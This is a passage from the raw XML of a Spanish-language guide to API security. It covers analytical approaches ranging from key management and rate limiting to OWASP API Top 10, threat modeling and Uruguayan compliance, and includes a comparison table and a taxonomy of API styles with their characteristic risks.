        <w:t>1.14 Enfoque criptográfico y de gestión de claves.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¿qué firma, qué cifra y quién custodia las claves?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JOSE (JWS/JWE/JWK/JWA), PKI, mTLS, KMS/HSM, rotación de claves, criptografía poscuántica.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diseño de confianza técnica y cumplimiento.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claves de larga vida, algoritmos débiles y firmas mal validadas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.15 Enfoque por control de tráfico.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¿qué límites y políticas aplico al caudal?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gateway, rate limiting, cuotas, throttling, concurrencia, bot management, geo/IP policy.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abuso, scraping, fuerza bruta, protección de disponibilidad.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una API costosa se convierte en un vector de denegación de servicio barato.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.16 Enfoque por validación y saneamiento.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¿confío en la entrada? (correcto: no).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inyección (SQL/NoSQL/comandos), SSRF, XXE, deserialización insegura, mass assignment, plantillas, type confusion.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revisión de código y pruebas ofensivas.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el token es impecable y la API es inyectable.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.17 Enfoque por observabilidad y respuesta.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¿cómo sé que algo pasa, y qué hago cuando pasa?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logs, trazas, métricas, SIEM, detección de anomalías, revocación, respuesta a incidentes.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operación y seguridad conjuntas.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un token robado se usa durante semanas sin que nadie lo note.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.18 Enfoque por secretos, identidad de máquina y cadena de suministro.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¿dónde viven los secretos y quién los controla?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secret managers, rotación, escaneo de repos/CI, SBOM/SCA, seguridad del pipeline, terceros.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cuando hay CI/CD y dependencias externas (siempre).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los secretos terminan en un repo público y las dependencias introducen el próximo Codecov.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Familia C — Enfoques según PARA QUIÉN y POR QUÉ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.19 Enfoque por OWASP API Security Top 10.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¿cuál de los diez riesgos tengo hoy y cómo lo pruebo?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BOLA, Broken Authentication, BOPLA, consumo sin límites, BFLA, flujos de negocio, SSRF, misconfiguración, inventario, consumo inseguro.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auditoría práctica y priorización.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me quedo en la teoría de tokens sin cubrir autorización, negocio ni configuración.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.20 Enfoque por framework de threat modeling.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¿qué puede salir mal en este diseño, sistemáticamente?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STRIDE, LINDDUN (privacidad), PASTA, DREAD, árboles de ataque, diagramas de flujo de datos.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antes de escribir código; en revisiones de diseño.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resuelvo síntomas y no causas, y repito los mismos errores en cada API.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.21 Enfoque por audiencia.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¿a quién le hablo y qué le importa?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devs (cómo lo implemento), arquitectos (cómo lo diseño), seguridad (cómo lo rompo/defiendo), management (cuánto cuesta).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cualquier charla o documento; define el nivel de detalle.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pierdo al público por exceso o por defecto de profundidad.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.22 Enfoque por cumplimiento y regulatorio.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¿qué me exige la norma y cómo se traduce en controles?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ISO 27001, PCI DSS, NIST, y en Uruguay el marco de AGESIC, la Ley 18.331 y el Decreto 66/025 (con obligación de reporte a CERTuy).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gobierno, empresas reguladas, sector financiero y salud.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no puedo traducir "cumplir" en controles concretos de token y de API.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.23 Enfoque por privacidad y protección de datos.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¿qué datos personales cruzan la API y con qué base legal?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minimización, PII, consentimiento, retención, residencia, derecho de acceso y supresión.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cuando hay datos de personas (siempre).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una API segura puede seguir siendo ilegal por tratar datos de más.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.24 Enfoque por modelo de negocio y abuso económico.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¿qué gana un atacante con esta API, más allá de robar datos?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scraping, escalping, abuso de cupones, creación masiva de cuentas, fraude, reventa de datos y de capacidad.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productos con valor transaccional o de datos.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protejo la confidencialidad y me comen por el bolsillo con abuso de lógica.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.25 Enfoque por madurez y gobierno.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¿en qué nivel estoy y hacia dónde voy?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OWASP SAMM, modelos de madurez, catálogo de APIs, dueño por API, métricas, capacitación, centro de excelencia.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programas de seguridad y planes a mediano plazo.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hago acciones sueltas sin un camino de mejora.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.26 Enfoque por economía del atacante (modelo de amenaza).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¿cuánto le cuesta al atacante y cuánto me cuesta a mí defenderme?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costo de obtención de credenciales, valor del objetivo, superficie automatizable, ROI del ataque.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priorizar defensas con mejor relación costo/beneficio.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invierto donde no duele y dejo abierto lo barato de explotar.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.27 Enfoque histórico/evolutivo.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¿por qué cada tecnología nació, qué resolvió y qué dejó abierto?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Basic/Digest → cookies → API keys → OAuth 1.0 → bearer → JWT → OIDC/PKCE → mTLS/DPoP.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enseñanza de fundamentos y decisiones de arquitectura.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repito modas sin entender los términos de intercambio.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.28 Enfoque académico/formal.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¿qué principios de diseño se están violando?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principios de Saltzer &amp; Schroeder (mínimo privilegio, separación de privilegios, mediación completa, diseño abierto), capabilities, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>confused deputy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>trust boundaries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para dar rigor y citar fuentes primarias.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discuto herramientas sin principios, y las herramientas cambian; los principios no.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.29 Enfoque por resiliencia y disponibilidad.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¿qué pasa cuando algo falla o me saturan?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DoS/DDoS, consumo de recursos, backpressure, circuit breakers, degradación elegante, continuidad.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APIs críticas y de alto tráfico.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la seguridad se enfoca en confidencialidad y olvida la disponibilidad como parte de la tríada CIA.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1.30 Enfoque por anti-patrones.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Pregunta central:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> ¿qué errores concretos se repiten en la industria?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Qué mira:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> catálogo de malas prácticas (token en URL, secreto hardcodeado, autorización solo en el front, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>alg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> del token, paginación sin límites…).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Cuándo usarlo:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> como checklist rápido de revisión y para capacitación.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>Si lo omito:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> repito los mismos errores con distinto nombre.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Tabla comparativa de enfoques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r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Familia</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1958"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Enfoque</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1958"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Pregunta central</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1958"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Mejor para</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1958"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Si lo omito…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Capas de arquitectura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¿Dónde vive el control?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Arquitectos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Confundo authn con authz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Actor (persona/sistema/delegación)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¿Quién invoca?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MFA y M2M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Aplico mal la MFA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Ciclo de vida de la credencial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¿En qué eslabón falla?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Charla integral de tokens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Olvido rotar y revocar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Ciclo de vida del software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¿En qué fase se detecta?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Shift-left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Seguridad tardía y cara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Superficie de ataque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¿Desde dónde atacan?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Cubrir fugas reales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Ignoro CI y repos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Dato y contrato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¿Qué promete el contrato?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API-first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Aparecen shadow fields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Estilo de API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¿Cómo cambian los riesgos?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Organizaciones multiestilo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Recetas de REST mal aplicadas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Protocolo y transporte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¿Qué garantiza el canal?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mTLS, mesh, proxies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Asumo cifrado extremo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Tipo de consumidor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¿Para quién es la API?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Elegir identidad y confianza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Trato igual a socio y anónimo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Modelo de despliegue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¿Dónde corre?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Distribuido y nube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Supuestos de red plana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Identidad humana vs. no humana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¿Cuántas NHIs tengo?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M2M y CI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NHIs sin dueño ni rotación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Paradigma de confianza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¿Identidad o posesión?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Profundidad conceptual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No entiendo el riesgo bearer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Modelo de autorización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¿Puede hacer esto sobre esto?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Objetos por usuario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Dejo BOLA abierto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Criptografía y claves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¿Quién firma y custodia?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Confianza técnica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Claves eternas y débiles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Control de tráfico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¿Qué límites aplico?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Abuso y disponibilidad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DoS barato y scraping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Validación y saneamiento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¿Confío en la entrada?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Código y pentest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API inyectable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Observabilidad y respuesta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¿Cómo lo detecto y actúo?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Operación y SOC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Token robado invisible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Secretos y cadena de suministro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¿Dónde viven los secretos?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CI/CD y terceros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Próximo Codecov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OWASP API Top 10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¿Qué riesgo tengo?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Auditoría y priorización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Teoría sin práctica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Threat modeling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¿Qué puede salir mal?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Diseño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Síntomas, no causas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Audiencia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¿A quién hablo?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Cualquier comunicación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Pierdo al público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Cumplimiento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¿Qué me exigen?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Gobierno y regulado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Norma sin control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Privacidad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¿Qué datos trato?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PII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Seguro pero ilegal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Negocio y abuso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¿Qué gana el atacante?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Productos transaccionales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Me comen el margen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Madurez y gobierno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¿Hacia dónde voy?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Programa de seguridad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Acciones sueltas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Economía del atacante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¿Cuánto le cuesta?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Priorizar defensas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Invierto donde no duele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Histórico/evolutivo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¿Por qué nació?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Fundamentos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Repito modas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Académico/formal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¿Qué principio se viola?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Rigor y citas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Herramienta sin principio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Resiliencia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¿Qué pasa si falla?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APIs críticas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Olvido disponibilidad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Anti-patrones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¿Qué errores se repiten?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Capacitación y revisión</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1958"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Mismos errores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Recomendación de combinación</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Para </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>una charla o un programa completo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> conviene una combinación, no un solo lente:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Enfoque histórico/evolutivo + ciclo de vida de la credencial</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> para el hilo narrativo (por qué estamos donde estamos).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Enfoque por actor + por modelo de autorización</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> para el corazón técnico (persona vs. sistema; objeto vs. función).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Enfoque por OWASP API Top 10 + por estilo de API</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> como atlas de vulnerabilidades y de superficies.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Enfoque por threat modeling + por ciclo de vida del software</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> para el "cómo se trabaja".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Enfoque por cumplimiento, privacidad y negocio</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> para el "por qué le importa a la organización".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Esa mezcla es, exactamente, la estructura del resto de este documento: los enfoques son el mapa; las secciones siguientes son el territorio.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>2. Taxonomía de las APIs: qué estamos protegiendo exactamente</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Antes de los tokens conviene saber </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>de qué estamos hablando</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> cuando decimos "API". No todas se parecen, y cada familia trae su propia clase de falla. Esta sección clasifica las APIs por cinco ejes: estilo, consumidor, despliegue, contrato y tipo de dato. Sirve como índice mental para elegir qué mirar en cada caso.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>2.1 Por estilo o paradigma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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Estilo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Cómo funciona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Fortalezas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Riesgos característicos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i w:val="0"/>
              </w:rPr>
              <w:t>REST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Recursos sobre HTTP, verbos, representaciones JSON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Simple, cacheable, ubicuo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BOLA/BFLA, over-fetching, versionado laxo, IDOR por IDs predecibles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i w:val="0"/>
              </w:rPr>
              <w:t>GraphQL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Un endpoint, el cliente pide la forma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Eficiencia de datos, tipado fuerte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 xml:space="preserve">Consultas profundas/costosas, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i/>
              </w:rPr>
              <w:t>introspection</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> expuesta, BOLA por resolver, sobre-exposición de campos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i w:val="0"/>
              </w:rPr>
              <w:t>gRPC / Protobuf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RPC binario sobre HTTP/2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Rendimiento, contrato estricto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Reflexión expuesta, métodos no previstos, falta de inspección por proxies/WAF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i w:val="0"/>
              </w:rPr>
              <w:t>SOAP / XML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Mensajes XML con WSDL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Contrato formal, WS-Security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 xml:space="preserve">XXE, WS-Security mal configurado, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i/>
              </w:rPr>
              <w:t>entity expansion</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>, complejidad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i w:val="0"/>
              </w:rPr>
              <w:t>WebSocket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Canal bidireccional persistente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Tiempo real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Autenticación solo al abrir el canal; autorización por mensaje; cross-site hijacking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i w:val="0"/>
              </w:rPr>
              <w:t>Webhooks / callbacks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El proveedor llama a tu URL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Integración push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SSRF, falta de firma (HMAC), replay, URLs no validadas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i w:val="0"/>
              </w:rPr>
              <w:t>Event-driven / async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Colas y tópicos (Kafka, AMQP, SNS/SQS)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Desacople y escala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 xml:space="preserve">Autorización por tópico, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i/>
              </w:rPr>
              <w:t>event injection</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>, secretos de broker, datos en claro en el bus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i w:val="0"/>
              </w:rPr>
              <w:t>Serverless functions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Endpoints efímeros (functions)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Escala y costo variable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 xml:space="preserve">Configuración por defecto, IAM de la función, inyección de eventos, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i/>
              </w:rPr>
              <w:t>cold start</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> como vector de abuso</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Regla práctica:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> las recetas de REST (validar ID, verbo, rol) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> se trasladan automáticamente a GraphQL, eventos o WebSocket. Cada estilo exige su propio modelo de autorización.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>2.2 Por tipo de consumidor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>First-party:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> tus propios front-ends (SPA, móvil). El reto es proteger el artefacto en un cliente que el usuario controla.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Interno (servicio a servicio):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> tráfico este-oeste. El reto es la identidad de workload y el mínimo privilegio.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Partner / B2B:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> relación contractual con otra organización. El reto es la federación, la auditoría y el alcance acordado.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Público / open API:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sin relación previa con el consumidor. El reto es el abuso, el scraping y la ausencia de contexto de confianza.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Marketplace de terceros:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> aplicaciones de otros sobre tus datos. El reto es el consentimiento, el alcance y la revocación granular.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>2.3 Por modelo de despliegue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Monolito:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> un solo proceso; la seguridad es más simple de razonar y de auditar.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Microservicios:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> muchos servicios; la autorización debe ser </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>consistente</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> en todos, y el tráfico interno también se protege.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Serverless:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> piezas efímeras; la configuración y los permisos por función son el punto crítico.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Edge / CDN:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> la ejecución cerca del usuario; cuidado con dónde termina TLS y dónde viven los secretos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Service mesh:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sidecars con mTLS e identidad de workload; cambia dónde se aplican las políticas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>On-prem / nube / híbrido / multi-nube:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> cambian el perímetro, la residencia de datos y el modelo de identidad.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>2.4 Por contrato y versionado</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>OpenAPI / Swagger:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> contrato de REST; base para validación, documentación y pruebas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>AsyncAPI:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> el equivalente para eventos y mensajes.</w:t>
      </w:r>
